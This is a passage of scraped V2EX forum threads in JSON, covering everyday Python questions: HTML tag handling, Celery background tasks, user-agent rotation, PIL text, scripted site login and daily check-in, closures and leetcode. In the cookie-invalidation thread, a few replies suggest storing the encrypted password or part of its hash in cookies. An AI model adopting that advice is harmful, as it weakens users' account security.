树上操作，递归解出 DOM 列表的内容\r", "看了下 BeautifulSoup 里面也有 findChildren()这样的操作", "from w3lib.html import remove_tags\r", "remove_tags(text, which_ones=('div', 'a', ....))\r", "scrapy 裡面的一個庫", " 这个好！！！\r", "现在就是在用 scrapy 写爬虫\r", "\r", "这样就解决了！！\r", "\r", "````\r", "remove_tags(text, keep=('img')) \r", "````", "用 xpath 进行提取， xpath 可以 专门解析提取 属性。", "想多了 难道不知道图片地址还可以写到 css 么", "jsdom 知道不", "用 lxml ，别用 bs4 。 bs4 只支持 css selector,而且不支持 nth-child 这种。 lxml 支持 xpath,用谷歌浏览器开发者工具可以很方便提取元素的 xpath\r", "lxml 貌似只有排除一些 tag 的功能，没有保留一些 tag 的功能\r", "不过可以建立个保留的 tag 名称的集合，遍历所有 node ，把未在集合中的 tag 删了就行。\r", "当然有种情况是，你想保留 a 但不想保留 b ，那么\r", "<b><a></a></b>这种情况得需要注意了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>问：假设用 python 写了个端口扫描功能，基于 web 界面，端口扫描需要耗费一定时间，<br>\n怎么做才能实现用户输入指定 IP 提交任务，然后可以随意切换页面，后台进行扫描功能，<br>\n过一段时间后再切到结果页面直接查看扫描结果，扫描功能是直接写在 web 代码还是要另起一个独立脚本？</p>\n</div></div>", "<div class=\"topic_content\">感谢各位 V 友，大概有思路了，容我再折腾折腾</div>"], "reply": "13", "tittle": "Python web 的一个问题，描述较长，具体看正文", "comment": ["正文太长，下一题", "webui 和扫描脚本都单独用一个进程", "另起一个独立脚本。\r", "\r", ">过一段时间后再切到结果页面直接查看扫描结果\r", "新任务生成一个 id ， session 记录这个 id ，然后访问结果页面时根据 id 查询，放 sql 还是 kv 就随意了。", "Celery", "有一个更简单的推荐： ", " Github 地址： ", "\r", "\r", "只需要 Redis 就可以了，简单易用。", "这种情况一般用任务队列。", "#6 漏正解， Celery 异步处理。", "简单一点，后台另起脚本运行任务，最后的结果输出到一个结果页面，那样就随便切换了", "任务队列", "Celery 异步调用。", "一点不影响啊，一个任务对应一个线程，把一个任务对应一个任务 ID ，线程把进度保持到数据库里面就行（ mysql sqlite mongodb redis 等等都可以），前端读数据库就可以了，一点也不复杂"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>import random\n\n\nclass MyFun(object):\n\n    def __getattr__(self, key):\n        if key == 'random':\n            return random.random()\n        else:\n            pass\n\nf = MyFun()\nf.random\n\n\n</code></pre>\n<p><strong>如上代码</strong></p>\n<p>如何把 f.random 传给一个变量，比如<code>a</code>，然后以后调用 a 就执行 f.random?</p>\n<p>试过浅拷贝、深拷贝都没用。。</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>是这样，这个类是一个库里随机生成 UserAgent 的方法 <strong>ua.random</strong></p>\n<p>我有一个爬虫，里面的变量是写好的，比如 self.user_agent</p>\n<p>爬虫每次请求都会把self.user_agent作为自己的 User-Agent</p>\n<p>所以我就想让把ua.random 传给self.user_agent，这样，就可以不变更原来的代码的情况下，实现自动更换useragent</p>\n<p>原来的 ua.random 的实现就是通过 <strong>getattr</strong> 来实现的，发现无论是深拷贝还是浅拷贝，倒过去的是值，没法直接引用ua.random</p>\n<pre><code>self.user_agent = ua.random\n</code></pre>\n<p><strong>UPDATE</strong>\n直接在原来的基础上套了一个类，也算是实现了;）</p>\n<pre><code>class MyFun(object): \n\ndef __repr__(self): \n\nfrom fake_useragent import UserAgent \nua = UserAgent() \nreturn ua.random \nf = MyFun()\n</code></pre>\n</div></div>"], "reply": "24", "tittle": "Python 的传址和传值疑问", "comment": ["你是想每次使用 a 的时候产生一个新随机数？\r", "\r", "```\r", ">>> a\r", "0.14750847086722485\r", ">>> a\r", "0.822349231203261\r", "```\r", "\r", "这样？", " 对啊～～`", " 应该怎么传", " 我认为做不到。坐等楼下黑科技。", "```\r", "In [6]: class A():\r", "   ...:   def __repr__(self):\r", "   ...:     return str(random.random())\r", "   ...: a = A()\r", "   ...:\r", "\r", "In [7]: a\r", "Out[7]: 0.313638352347\r", "\r", "In [8]: a\r", "Out[8]: 0.00887313470731\r", "```", " 这个 a 只能用来打印了 = =", " 在不修改他原来的类的情况下，有没有办法引用他这个 f.random", " #6 挨个写, __add__，__str__, __eq__ ...\r", "因为 LZ 并没有说「调用 a 」是什么意思，比如 b = a ，这是在拷贝 a 还是在调用 a ？", " #7 这是一个 XY 问题", "你的 __getattr__ 是做什么的。。。我觉得按照描述是做不到，但如果不一致性要求的话可以试试用 __call__() 来把类模型为函数：\r", "\r", "```\r", "import random\r", "\r", "\r", "class MyFun(object):\r", "    def __getattr__(self, key):\r", "        if key == 'random':\r", "            return random.random()\r", "        else:\r", "            pass\r", "\r", "    def __call__(self):\r", "        return random.random()\r", "\r", "a = MyFun()\r", "a # randomnumber 1\r", "a # randomnumber 2\r", "```\r", "但这和直接调 random 方法有什么区别啊。。。。", " 最后两行应该是 `a()` 吧", "obj.x 这种形式还可以用描述器，直接访问变量 x 这种形式应该是没有办法做到吧。", "不懂，但是有点像 scheme 里 quote ， eval 这些东西", " \r", "是这样，这个类是一个库里随机生成 UserAgent 的方法 ；\r", "我有一个爬虫，代码里面的变量是写好的，比如 self.user_agent\r", "爬虫每次请求都会把 self.user_agent 作为自己的 useragent\r", "\r", "所以我就想直接让 self.user_agent 每次都引用 ua.random\r", "\r", "但是，发现是直接传的值过去，每次生成的内容是一样的。。", "看了下原来的 ua.random 的实现就是通过 __getattr__ 来实现的", "好了，再套一个类上去就搞定了\r", "\r", "\r", "class MyFun(object):\r", "\r", "    def __repr__(self):\r", "\r", "        from fake_useragent import UserAgent\r", "        ua = UserAgent()\r", "        return ua.random\r", "\r", "f = MyFun()", " #16 不不不，__repr__ 是搞笑的，要么改 self 对应类的 __get_attr__，要么用 __get__，具体见 ", " #17 tltr 就抄 ", " 就行了", "看了一下，大致明白了 lz 的意思。\r", "\r", "你是要每次都 generate 一个新的 UserAgent ？\r", "\r", "直接定义一个 gen_ua() 不就好了，\r", "\r", "def gen_ua():\r", "    return UserAgent().random\r", "\r", "然后\r", "\r", "self.user_agent = gen_ua()", " 函数返回的是值，调用 self.user_agent 是不会变的，嘻嘻，刚开始我也没转过来", " 那么这个样子呢，改成计算属性好了\r", "\r", "class WTF(object):\r", "    def __init__(self):\r", "        pass\r", "\r", "    @", "\r", "    def user_agent(self):\r", "        return UserAgent().random\r", "\r", "\r", "wtf = WTF()\r", "wtf.user_agent # call user_agent()\r", "\r", "__repr__ 不是像你这么用的\r", "\r", "Called by the repr() built-in function to compute the “ official ” string representation of an object. If at all possible, this should look like a valid Python expression that could be used to recreate an object with the same value (given an appropriate environment). If this is not possible, a string of the form <...some useful description...> should be returned. The return value must be a string object.", "Python 是按 assignment 传的", "property 应该是正解吧", " Yep ！！！ a()！！！"]},
{"content": ["<div class=\"topic_content\">使用 PIL 的 text 方法可以加文本，但无法对文本进行格式化，例如调整字符间距等格式。 \r<br>\r<br>有没有什么办法可以对图片上的文本进行格式化呢？\r<br>\r<br>谢谢。</div>"], "reply": "11", "tittle": "Python 如何在图片上 添加 带格式的文本？", "comment": ["我最开始用的是手动写代码计算（包括换行、行距、字间距等等）。但后来也觉得麻烦。\r", "现在的方案是渲染成网页，然后一个截屏结束。\r", "\r", "\r", "\r", "简单高效（如果用得比较少的时候）。\r", "但如果你需要产生很大量的，每一张都不一样的截图，可能还是要考虑自己写代码实现，然后异步调用。\r", "\r", "中间有一个坑是中文 font 安装，但填起来问题不大。", "这是两个我生成的图文供参考：\r", "\r", "\r", "\r", "因为是网页，所以网页可以显示成什么样，你就可以生成什么样的图，控制力很强，也不需要写代码。部署完成后需要修改，改改 CSS 重刷就可以试试看到效果。缺点就是每次生成都需要一些时间（配置更好的机器或者资源可能可以提升部分性能） 但生成截图本来都属于大开销，理论上反正都需要异步生成的，所以应该还好。", " \r", "你好，感谢回复。\r", "我目前就是用手动写代码计算的，细调起来特别麻烦。\r", "你说的这个是个很好的办法，实现起来也简单，没必要跟代码死磕。 只是需要多部署一个 web server 来渲染而已。 \r", "感谢。", "可不可以渲染成网页然后转成图片呢。你需要的图片可以当作背景，然后是不是可以修改字体样式了，之后再转换成图片格式", " \r", "1 楼就是这个意思。 渲染成网页，然后用 PhantomJS 来截图。", " soga ，原来如此", " 感谢分享~用 Python 图像库生成，字体确实是个比较烦的地方", "顺便借地方提一个问题：\r", "如果需要带 Alpha 通道的图片的话，有什么解决办法码？因为网页截图出来的都是有背景色的。", "我是通过计算间距来做的，但是一碰上中英文混合就崩溃了。", " 不是很清楚你具体的场景。比如透明的 png ？这种可能不是需要技术上的方案，而是设计和功能上的整合方案来回避你不想出现的某个结果。", " 大体上就是需要：\r", "居中排版，文字描边（粗），字体回退，获取实际描画尺寸，透明背景色， Unicode/OTF 额外渲染功能（组合用文字、 ligature 、 Color Emoji 等，非必须）图片格式 PNG 或 WebP 皆可\r", "\r", "目前用 PIL （ pillow ）只实现了居中排版、文字描边，描画尺寸和透明背景。其他的还没找到方案。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport requests\nfrom bs4 import BeautifulSoup\n\nlogin_url=r'https://www.v2ex.com/signin'\nheaders = { \n\t\"content-type\":\"application/x-www-form-urlencoded\",\n    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',\n    'Origin': 'https://www.v2ex.com',\n    'Referer': 'https://www.v2ex.com/signin'    \n}  \nuserName='pive'\npassword='******'\ns=requests.Session()\nres=s.get(login_url,headers=headers)\nsoup=BeautifulSoup(res.content,\"html.parser\")\nonce=soup.find(\"input\",{\"name\":\"once\"})[\"value\"]\nformUserName=soup.find(\"input\",type=\"text\")[\"name\"]\nformPassword=soup.find(\"input\",type=\"password\")[\"name\"]\nprint(once+\"\\n\"+userName+\"\\n\"+password)\npost_data={\n\tformUserName:userName,\n\tformPassword:password,\n\t\"once\":once,\n\t\"next\":\"/settings\"\n}\ns.post(login_url,post_data,headers=headers)\nf = s.get('https://www.v2ex.com/settings',headers=headers)\nwith open('v2ex.html',\"wb\") as v2ex:\n\tv2ex.write(f.content)\n</code></pre>\n</div></div>", "<div class=\"topic_content\">多谢各位，已解决问题。原因是我用户名的表单取错，改成下面这样就好了。\r<br>\r<br>soup=BeautifulSoup(res.content,\"html.parser\")\r<br>form=soup.find(\"form\",action=\"/signin\")\r<br>once=form.find(\"input\",{\"name\":\"once\"})[\"value\"]\r<br>formUserName=form.find(\"input\",type=\"text\")[\"name\"]\r<br>formPassword=soup.find(\"input\",type=\"password\")[\"name\"]</div>"], "reply": "14", "tittle": "本人正在学习 Python 爬虫，想模拟登录本网站（ ", "comment": ["post 之后呢？ cookie 呢？", "我也刚学，要不用 pprint 输出一下 post_data 和 headers ，\r", "或者 post_data 的 data 要写上？\r", "s.post(login_url,data=post_data,headers=headers)\r", "\r", "我用的 lxml 的 etree 解析的，其他的跟你差不多，现在每天自动获取铜币", " post 只登录啊，登录之后打开一个需要登录的连接（ ", " ）正常的话应该会进到这个页面的，现在是跳回去登录页面了（提示：你要查看的页面需要先登录）。 request.Session()不是自动处理 cookie 的吗？", " 看到自动获取铜币这个我心动了，有没有写成可执行脚本什么的啊", "```python3\r", "#-*- coding=utf-8 -*-\r", "import requests\r", "import re\r", "from lxml import etree\r", "\r", "signin='https://v2ex.com/signin'\r", "'\r", "url='https://v2ex.com/mission/daily'\r", "headers = {  \r", "    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',  \r", "    'Origin': '", "',  \r", "    'Referer': '", "',  \r", "    'Host': '", "',  \r", "}\r", "data={}\r", "\r", "def sign(username,passwd):\r", "    session=requests.Session()\r", "    session.headers=headers\r", "    loginhtm=session.get(signin,verify=False).content\r", "    page=etree.HTML(loginhtm)\r", "    x=page.xpath(\"//input[@class='sl']/@name\")\r", "    usernameform=x[0]\r", "    passwdform=x[1]\r", "    onceform=page.xpath(\"//input[@name='once']/@value\")[0]\r", "    data[usernameform]=username\r", "    data[passwdform]=passwd\r", "    data['once']=onceform\r", "    data['next']='/'\r", "    loginp=session.post(signin,data=data,verify=False)\r", "    sign=session.get(url).content.decode('UTF-8')\r", "    qiandao=re.findall(\"location.href = '(.*?)'\",sign)[0]\r", "    if (qiandao == '/balance'):\r", "        print (\"已经签过了\")\r", "    else:\r", "        session.get(home+qiandao,verify=False)\r", "        print ('签到成功')\r", "\r", "if __name__=='__main__':\r", "    username='siloong'\r", "    passwd='123456'\r", "    requests.packages.urllib3.disable_warnings()\r", "    sign(username,passwd)\r", "```\r", "--代码来源于互联网", " 发这个违规不。。见我 github/shell/v2ex 文件， selenium_v2ex 是用 selenium 完成的，树莓派是 arm 不支持 phantomjs ，所以又用 request 完成了，你记得替换 username 和 password", "password='******'\r", "提示：密码错误。\r", "\r", "哈哈哈哈。", "class v2ex():\r", "    def __init__(self):\r", "        self.s = requests.Session()\r", "        self.headers = {\r", "            '", "',\r", "            '", "',\r", "            'Referer':'http://www.v2ex.com/signin',\r", "            'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36'\r", "        }\r", "\r", "    def get_requires_data(self):\r", "        html = self.s.get('http://www.v2ex.com/signin', headers=self.headers).text\r", "        once = re.search(r'value=\"(\\d{5})\"', html).group(1)\r", "        username = re.search(r'type=\"text\" class=\"sl\" name=\"(.*?)\"', html).group(1)\r", "        password = re.search(r'type=\"password\" class=\"sl\" name=\"(.*?)\"', html).group(1)\r", "        return {\r", "            'once': once,\r", "            'username': username,\r", "            'password': password\r", "        }\r", "\r", "    def login(self, username, password):\r", "        data = self.get_requires_data()\r", "        form_data = {\r", "            data['username']: username,\r", "            data['password']: password,\r", "            'once': data['once'],\r", "            'next': '/'\r", "        }\r", "        res = self.s.post('http://www.v2ex.com/signin', data=form_data, headers=self.headers)\r", "        return res\r", "\r", "    def sign(self):\r", "        html = self.s.get('http://www.v2ex.com/mission/daily', headers=self.headers).text\r", "        once_code = re.search(r'signout\\?once=(\\d{5})', html).group(1)\r", "        url = '", "' + once_code\r", "        res = self.s.get(url, headers=self.headers)\r", "        result = res.text\r", "        days = re.search(r'已连续登录 (\\d+) 天', result).group(1)\r", "        if not result.find('今天的登录奖励已经领取过了哦'):\r", "            # 如果找不到，则说明签到成功。\r", "            print('[v2ex]签到成功，已经连续签到%s 天'%days)\r", "        else:\r", "            # 如果找得到，则代表已经签到过了\r", "            print('[v2ex]签到失败，您已经签到过了，已经连续签到%s 天'%days)", "  \r", "看了下登录页面\r", "\r", "你表单弄错了，改成这样就行了\r", "\r", "formUserName=soup.find(\"input\",placeholder=\"用户名或电子邮箱地址\")[\"name\"]", "  是的，我刚刚也发现了这个问题。", "selenium phantomjs 简单粗暴", "你们都是怎么抓包的呢...."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看一些代码会写成函数中嵌套函数，例如：</p>\n<pre><code>\n def func():\n     def new_func():\n          return 1\n    a = new_func()\n</code>\n</pre>\n<p>这种写法和 lambda 和单独创建一个 function 有什么区别或优势吗？</p>\n</div></div>"], "reply": "20", "tittle": "Python 为什么要使用函数嵌套函数", "comment": ["对啊,要写闭包的时候很好用的", "查看一下柯里化的定义，这样写返回的新函数能够保持当时的状态，而且能够达到惰性求值的效果（用到这个函数的时候再处理传入的参数）", "例如装饰器传参，就是多层嵌套的函数，", "因为 lambda 的限制", "你的例子确实 lambda 也可以做到。但是下面的呢？\r", "\r", " def func(x):\r", "     def new_func(y):\r", "          return x+y\r", "     return new_func\r", "\r", ">>> a = func(10)\r", ">>> a(3)\r", "13\r", ">>> a(5)\r", "15", "也许是为了方便吧。脚本嘛", "额，其实我也不是很了解这两种用法的差异的，不过一不小心就写了出来 @", " \r", "\r", "In [1]: def func(x):\r", "   ...:     return lambda y:y+x\r", "   ...:\r", "\r", "In [2]: a = func(10)\r", "\r", "In [3]: a(3)\r", "Out[3]: 13\r", "\r", "In [4]: a(5)\r", "Out[4]: 15", " 你的例子不合适啊。\r", "\r", ">>> a = lambda x: lambda y: x + y\r", ">>> b = a(10)\r", ">>> b(3)\r", "13\r", ">>> b(5)\r", "15", "因为 lambda 是匿名的，我想区别应该是名字是否有意义，比如递归吧。\r", "\r", ">>> def func(x, sum):\r", "...     if(x==0):\r", "...             return sum\r", "...     return func(x-1, sum + x)\r", "...\r", ">>> func(10, 0)\r", "55\r", "\r", "lambda 大概写不出上面这个递归？", "能省几个参数，函数的作用域小了", "一般是返回一个函数指针时用。一般外部固定了函数指针的参数，但是自己又需要传递给函数指针一些数据，这样嵌套函数可以使得内部函数可以访问外部函数的变量。关键字：闭包，需求的例子：装饰器。\r", "\r", "不用 lambda 的原因是 lambda 限制太大，不方便。", "这就是 meta 编程啊", "lambda 你能多写几行么", "Python 里 lambda 只能写一行啊", " \r", "需要做到这个的话直接用指针不行吗？", " 无法实现，像下面的装饰器例子：\r", "\r", "\r", "\r", "需要将 @", "(123) 的 123 传递给 fffff 函数，但是 fffff 函数是会被当作 hello3 参数给用户调用的，用户不会帮你把 123 传递进去，只能通过闭包的方式传递进去 123 .", "lambda 写复杂的函数很麻烦啊", "这是一种嵌套函数的写法，有时候它和 lambda 没什么区别，但有些情况下它会实现一个闭包，所以我姑且认为楼主是想知道闭包的特性．\r", "那么这里首先强烈建议楼主了解一下 namespace 与变量作用域的相关知识．\r", "\r", "如果只要了解闭包的概念，请参考这篇文章．\r", "\r", "如果想知道闭包的实现原理．那么你必须得明白函数调用过程．因为闭包本身就是调用一个函数反回另一个函数．\r", "这里推荐 UCSB 的教程，提供了一个交互式的函数调用演示程序．共６个课程，每个课程都很短，但看完这些你大概能对函数调用帧栈有初步了解．\r", "\r", "到现在你已经可以开始探究 python 在函数调用中如何精妙地完成参数传递．\r", "\r", "如果能坚持到这里，那么你已经停不下来了...函数调用过程中所有涉及到的源码作者都给出了分析，看完之后应该什么都明白了\r", "\r", "以下链接可以看看，也许能帮助你理解源码．\r", "\r", "一种劣习，让函数变成有状态的，或者叫不完全依赖于字面输入，还依赖一个隐藏输入的东西"]},
{"content": ["<div class=\"topic_content\">您好，\r<br>\r<br>我在用 segtag ，但是我高不清楚 ICTCLAS 和 segtag 到底有什么关系。\r<br>在 <a target=\"_blank\" href=\"http://cloudtranslation.cc/segtag.html\" rel=\"nofollow\">http://cloudtranslation.cc/segtag.html</a> 这个网页上，可以看到 ICTCLAS web link 我不懂为什么。\r<br>然后，我没有找到什么参考，我不知道 segtag 的训练语料库是什么，精度多少，等等。</div>"], "reply": "目前尚无回", "tittle": "Segtag : 训练语料与精度", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>用户原来选择了记住登录密码的情况：</p>\n<p>是在 session 中存一个 key ，每次登陆和 cookie 校对一下？<br>\n还是，在数据表中存一个 key 来和 cookie 校对？</p>\n<p>一般大家用什么方式简单还安全？<br>\n(说明：没有做长连接，不会一修改密码，就踢异地账号下线。只有等异地账号重新请求时，才能再拒绝cookie访问）</p>\n</div></div>"], "reply": "9", "tittle": "用户修改密码之后，怎么禁止原来登录过的 cookie（还没过期）不能再访问？", "comment": ["把数据库中的密码串(加密后的)或密码串的一部分存到 cookie （ cookie 要加密呀），每次验证登录权限时跟数据库中做对比", "用户注册时，在用户表里保存一个随机产生的 KEY ，当用户修改密码时，更新这个 KEY 。\r", "用户登录时选择“记住登录密码”，下发三个 cookie ： UserID 、过期时间、(UserID+过期时间+KEY)的数字签名。\r", "\r", "用户再次登录请求时，先判断过期时间是否有效，然后通过 UserID 加载 KEY ，比对数字签名。\r", "\r", "注意点：\r", "(1) 不要通过设定 Cookie 过期时间的方式，限制密码保存天数，用户可以很容易篡改 Cookie 过期时间的，应该下发过期时间，并且把过期时间加到数字签名内容中。\r", "(2) 数字签名，最简单的方式是使用 HMAC_SHA1 算法，如果金融类网站可以使用更加安全的 RSA 签名。", "cookies 信息生成与密码有关就行了，", "为提高安全性：\r", "(1) cookie 的 HttpOnly 属性要设置为 True ，防止脚本注入后，通过 javascript 窃取 cookie 。\r", "(2) 如果安全要求高，网站可以启用 https ，然后配置 cookie 的 Secure 属性为 True ， cookie 仅在 https 协议传输，如果 http 协议不会传输，可以防止网络窃听 Cookie ，冒用登录。", " @", " 直接截一段密码的 hash 值的方式简单易行\r", "\r", " 月底就全改 https ，明年 1 月好多新浏览器，苹果都强制 https ，正好一并改了，感谢建议！", "修改密码的用户置标志位，让其重新登陆", "cookie 组合加密后  和数据库中加密过的 key 对比", "session id 入库，同时也放 redis\r", "\r", "改密码等操作，从数据库找出 session id 同时从数据库和 redi 删掉。", "我是直接把密码 aes 加密存在 cookie 里，每次登录对比一下。\r", "反正密钥只有我知道。。"]},
{"content": ["<div class=\"topic_content\">非常奇葩的需求，但是真正遇到的时候也挺烦人的。 \r<br>google 了一下，有人居然是通过该 es 的 mapping 控制返回全量的。感觉很无语 \r<br>用 scroll 就能搞定。 \r<br><a target=\"_blank\" href=\"https://github.com/howardyan93/useful_script/blob/master/dump_es2mongo.py\" rel=\"nofollow\">https://github.com/howardyan93/useful_script/blob/master/dump_es2mongo.py</a></div>"], "reply": "目前尚无回", "tittle": "写了一个从 elasticsearch 倒数据到 mongo 的脚本。。", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://leetcode.com/problems/guess-number-higher-or-lower/\" rel=\"nofollow\">https://leetcode.com/problems/guess-number-higher-or-lower/</a>\n这道题我以为很简单，用二分法写了一下，但执行时候报超时（而且为了增加效率我把除法改成了位运算），我自己拿到 pycharm 里试了一下没问题。不知道是哪段代码让 leetcode 不能通过的。</p>\n<pre><code>    def guessNumber(self, n):\n        \"\"\"\n        :type n: int\n        :rtype: int\n        \"\"\"\n        if n &lt; 2:\n            return n\n        deep = 1\n        x = n &gt;&gt; deep\n        while 1:\n            result = guess(x)\n            deep += 1\n            if result &lt; 0:\n                x = x + (n &gt;&gt; deep)\n            elif result &gt; 0:\n                x = x - (n &gt;&gt; deep)\n            else: \n                return x\n</code></pre>\n</div></div>"], "reply": "17", "tittle": "leetcode Python 解释器的问题", "comment": ["有一个 case 死循环了吧", "-1 : My number is lower\r", " 1 : My number is higher\r", " 0 : Congrats! You got it!", "```    \r", "    def guessNumber(self, n):\r", "        \"\"\"\r", "        :type n: int\r", "        :rtype: int\r", "        \"\"\"\r", "        if n < 2:\r", "            return n\r", "        low = 1\r", "        high = n\r", "        while 1:\r", "            x = (low + high) / 2\r", "            result = guess(x)\r", "            if result < 0:\r", "                low = x - 1\r", "            elif result > 0:\r", "                high = x + 1\r", "            else:\r", "                return x\r", "```\r", "\r", "换了一种方式，然并卵啊，依然不好使。\r", "问题是这俩写法我在 pycharm 里都是正常的", "还是 java 写省事，我有个算法用 Swift 写的，死活过不去，报超时。后来用 java 写一遍，算法都一样，通过了。", "guess(x) 是什么？", " 预定义的一个函数，返回你猜的数字：\r", "-1 : My number is lower\r", " 1 : My number is higher\r", " 0 : Congrats! You got it!", " 应该是，但我看不出来停留在哪了。 pycharm 里执行正常。", " 结果页有 case 的，点进去看一下就知道了", " 非常简单的 case ，就报超时了。。而在 pycharm 里调试，发现只循环了 4 次", "二分逻辑写错了，注意 guess 的定义，简单改了下\r", "\r", "```\r", "class Solution(object):\r", "    def guessNumber(self, n):\r", "        \"\"\"\r", "        :type n: int\r", "        :rtype: int\r", "        \"\"\"\r", "        if n < 2:\r", "            return n\r", "        low = 1\r", "        high = n\r", "        while 1:\r", "            x = (low + high) // 2\r", "            result = guess(x)\r", "            if result < 0:\r", "                high = x - 1\r", "            elif result > 0:\r", "                low = x + 1\r", "            else:\r", "                return x\r", "```", " ...多谢，我把 guess 的定义看反了", " \r", " \r", "已解决，我弱智了，看错了 guess 的返回结果定义，不是我猜的数字小了返回-1 ，而是答案小了返回-1", "第一种写法最终的答案应该是这样\r", "\r", "```\r", "    def guessNumber(self, n):\r", "        \"\"\"\r", "        :type n: int\r", "        :rtype: int\r", "        \"\"\"\r", "        if n < 2:\r", "            return n\r", "        deep = 1\r", "        x = n >> deep\r", "        while 1:\r", "            result = guess(x)\r", "            deep += 1\r", "            if result > 0:\r", "                x = x + (n >> deep) + 1\r", "            elif result < 0:\r", "                x = x - (n >> deep) - 1\r", "            else: \r", "                return x\r", "```", "```\r", "lhs, rhs = 1, n\r", "while lhs < rhs:\r", "    mid = (lhs + rhs) >> 1\r", "    lhs, rhs = [(mid, mid), (mid+1, rhs), (lhs, mid-1)][guess(mid)]\r", "```", " 赞，写的更漂亮了", "python 位运算并不比除法快。", " 怎么讲？"]},
{"content": ["<div class=\"topic_content\">其实是看到这个相关的问题才想起要发贴的 <a target=\"_blank\" href=\"https://www.v2ex.com/t/324279\" rel=\"nofollow\">https://www.v2ex.com/t/324279</a>\r<br>\r<br>安装时信息如下\r<br>\r<br>  pip install --index-url <a target=\"_blank\" href=\"http://pypi.doubanio.com/simple/\" rel=\"nofollow\">http://pypi.doubanio.com/simple/</a> requests --trusted-host <a target=\"_blank\" href=\"http://pypi.doubanio.com\" rel=\"nofollow\">pypi.doubanio.com</a> QScintilla\r<br>Collecting requests\r<br>\r<br>  Downloading <a target=\"_blank\" href=\"http://pypi.doubanio.com/packages/59/dc/54d39bef11678853ca78fc6167cc1b57becf491548942246dd2226bf2bd2/requests-2.12.2-py2.py3-none-any.whl\" rel=\"nofollow\">http://pypi.doubanio.com/packages/59/dc/54d39bef11678853ca78fc6167cc1b57becf491548942246dd2226bf2bd2/requests-2.12.2-py2.py3-none-any.whl</a> (575kB)\r<br>    100% |████████████████████████████████| 583kB 3.2MB/s\r<br>Collecting QScintilla\r<br>  Could not find a version that satisfies the requirement QScintilla (from versions: )\r<br>No matching distribution found for QScintilla\r<br>\r<br>\r<br>  pip -V\r<br>pip 9.0.1 from c:\\python27\\lib\\site-packages (python 2.7)</div>", "<div class=\"topic_content\">呃，下面有几位让我用代理的，是不是机器人啊。\r<br>我贴出来的信息很明显看出来是用豆瓣代理的啊。</div>", "<div class=\"topic_content\">总算知道了，这个包不支持 2.7</div>"], "reply": "28", "tittle": "Python2.7 + 64 位 + Win7 ，用 pip 安装模块是不是很麻烦？", "comment": ["proxifier 代理下 pip 的地址就可以， py3py2 都很正常。", "推荐在 linux 下搞 python ， windows 安个虚拟机就好了。 windows 下毛病太多，折腾不起", "windows  的编码问题， 还有些模块根本用不了", "我在搞 jsp 是不是落伍了.", "在 win 环境下搞 Python 一年多，感觉还好。 pip 安装跟 Linux 几乎一样。就是在 win 上搭建 python 开发环境很麻烦。", "还好，全局翻。\r", "\r", "生产环境我都是从开发机打包 lib 文件夹过去的。", "win 下写 python 简直就是和自己过不去", "有些包安装比较麻烦。 IDE 用 PyCharm", "pip 豆瓣源", "相对来说 Python 在 Win 环境下已经比其他同类好很多了", "windows 开个虚拟机装个没有图形的 Linux ，来个 ssh 工具链接上写，很自在", "用 mini_anaconda 挺好的，以前在 win 环境下一直用的是它", "基本上没有不方便的，除了 package 只支持 Linux 的情况。一般国内的 pypi 源或者 ", " whl 就够用了。", "路过提一句--index-url 可以写成 -i", "来人，给公子上 anaconda", "windows 下确实比较麻烦，得用到 powershell ，有些依赖还好，有 msi 的安装文件， 不如 win10 的 ubuntu bash on windows ，或者直接虚拟机装一个 basic linux ，像 arch ， fedora 基础版这种，只有终端没有图形界面，比 windows 方便多了", "现在还有用 python 不知道 anaconda 的", " \r", " vscode 或者直接 vs,很好用", " \r", "py2.7  在 win 下绕不过去的一道坎:GBK 到 utf-8", "win 下 python 最好装 32 位，兼容问题", "为什么不用 3 往上版本?", "windows 下太蛋痛，为了装模块 pywin ， wingw ， windows 补丁 乱七八糟装了一堆。", "wingw -> mingw", "为啥不用 anaconda ？ windows 下的开发环境直接解决！", "\r", "针对附言,代理和第三方源还是有区别的", "pip 上这个包只有 Python 3.5 对应的文件，所以 Python 2.7 安装不了", "一直在 windows 下用 python ， 没什么不方便的。 我连代理都不用。\r", "你这个包不支持 python2.7 ， 得用 3 。", "换 py3"]},
{"content": ["<div class=\"topic_content\">我想把&lt;&gt;标签代码改成小写，其余部分不变应该怎么写？\r<br>比如把&lt;DIV&gt;Windows XP&lt;/DIV&gt;改成&lt;div&gt;Windows XP&lt;/div&gt;\r<br>\r<br>想用正则替换，但是没想好应该怎么做。\r<br>    pattern = re.compile(r'&lt;!--(.*?)/--&gt;',re.I|re.S)   \r<br>    htmlstr = re.sub(pattern,'',htmlstr)</div>"], "reply": "3", "tittle": "怎样只把标签代码改为小写？", "comment": ["```python\r", "# -*- coding: utf-8 -*-\r", "import re\r", "\r", "pattern = \"</?(\\w+)>\"\r", "txt = \"<DIV>Windows XP</DIV><A>Windows XP</A><script>Windows XP</script>\"\r", "\r", "\r", "def _sub(matchobj):\r", "    return matchobj.group(0).replace(matchobj.group(1),\r", "                                     matchobj.group(1).lower())\r", "\r", "print(re.sub(pattern, _sub, txt))\r", "\r", "```", " 考虑到存在单标签的情况。正则式需要修改一下`pattern = \"</?(\\w+)(?:[\\s\\S])*?/?>\"`", " 谢谢，这要让我自己想，想三天也想不出来个结果"]},
